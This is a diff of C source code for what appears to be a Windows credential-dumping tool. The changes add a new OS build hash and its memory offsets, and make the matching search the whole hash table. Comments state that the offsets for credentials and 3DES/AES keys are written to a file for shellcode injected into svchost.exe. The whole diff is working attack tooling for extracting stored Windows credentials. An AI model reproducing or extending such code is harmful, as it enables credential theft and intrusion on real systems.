@@ -151,7 +151,8 @@ char _md5_table[TABLE_LENGTH][33] = {
 	"6.1.7601.26561",
 	"10.0.16299.431",
 	"f17409ddc9a794eb39cfcd21d2c84c6f", // 10.0.19041.3324
-	"6548b134a3cf304b91490fe916d934b5" // 10.0.17763.4377
+	"6548b134a3cf304b91490fe916d934b5", // 10.0.17763.4377
+	"951a238e964be37f74c32564d2a92319" // 10.0.17763.4377
 
 };
 DWORD offset_table[TABLE_LENGTH] = {
@@ -161,6 +162,7 @@ DWORD offset_table[TABLE_LENGTH] = {
 
 DWORD _offset_table[TABLE_LENGTH][5] = {
 	// 目前来看，最后一个偏移量，只有win7系列的是0x18
+	// loonglost\3des\aes\判断决定随便写\0x38或者0x18
 	  {0x32BC3,0x39E5C,0x9E36E,0x108,0x38},
 	  {0x180B3,0x20CEC,0x94568,0x108,0x38}, // 10.0.19041.2913
 	  {0x16150,0x111DE,0x3261B,0xE8,0x18},
@@ -173,7 +175,8 @@ DWORD _offset_table[TABLE_LENGTH][5] = {
 	  {0x10588,0xD8FE,0x4CE0C,0xE8,0x18},
 	  {0x915C,0x3E328,0x3E34D,0xE8,0x38},
 	{0x1FA63,0x395DC,0x8CA6C,0xe8,0x38}, // 10.0.19041.3324
-	{0x37DEC,0x320FC,0x321C8,0xe8,0x38}  // 10.0.17763.4377
+	{0x37DEC,0x320FC,0x321C8,0xe8,0x38} , // 6548b134a3cf304b91490fe916d934b5
+	{0x374DC,0x31E3C,0x31F08,0xe8,0x38}  // 951a238e964be37f74c32564d2a92319
 };
 void getosversion(char* result) {
 	char buffer[1024] = { 0 };
@@ -392,13 +395,22 @@ int _EntryCode1()
 			if (!mainMD5()) {
 				printf("md5 failed, abort...\n"); exit(-1);
 			}
-			if (strcmp(_final_md5_hash, _md5_table[i]) != 0) {
-				printf("md5 mismatch, continue searching\n"); continue;
+			bool gotmatch = false;
+			int targetindex = 0;
+			for (int j = 0; j < TABLE_LENGTH; j++) {
+				if (strcmp(_final_md5_hash, _md5_table[j]) == 0) {
+					gotmatch = TRUE;
+					targetindex = j;
+					break;
+
+				}
 			}
+			if (!gotmatch){printf("md5 mismatch, continue searching\n"); continue;
+		}
 			offset = 1;
 			// 记录下来这个索引，写入到文件中，供注入到svchost.exe进程中的shellcode去读取
 			char write_out[123] = { 0 };
-			sprintf_s(write_out, 123, "%03d", i);
+			sprintf_s(write_out, 123, "%03d", targetindex);
 			sprintf_s(write_out + 3, 120, "%07d", pid);
 
 			// 我们从_offset_table中根据上面获取到的index，写入四个偏移量
@@ -408,16 +420,16 @@ int _EntryCode1()
 			// 偏移量的长度不会超过8字节，我们将其格式化为0填充的8位16进制字符串
 			// 8字节偏移量   4个一共占32字节
 
-			sprintf_s(write_out + 3 + 7, 123, "%08x", _offset_table[i][0]);
-			sprintf_s(write_out + 3 + 7 + 8, 123, "%08x", _offset_table[i][1]);
-			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, "%08x", _offset_table[i][2]);
+			sprintf_s(write_out + 3 + 7, 123, "%08x", _offset_table[targetindex][0]);
+			sprintf_s(write_out + 3 + 7 + 8, 123, "%08x", _offset_table[targetindex][1]);
+			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, "%08x", _offset_table[targetindex][2]);
 			// credential offset
 		//	sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
 			// 这个偏移需要进行很多的判断，不能直接硬编码
 			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", offset____);
 			// 
 				// _3des_aes_len_offset   windows10系列和windows7系列有点不一样
-			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, "%02x", _offset_table[i][4]);
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, "%02x", _offset_table[targetindex][4]);
 
 			// 把版本号也写进去
 			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8 + 2, 123, "%s", res);
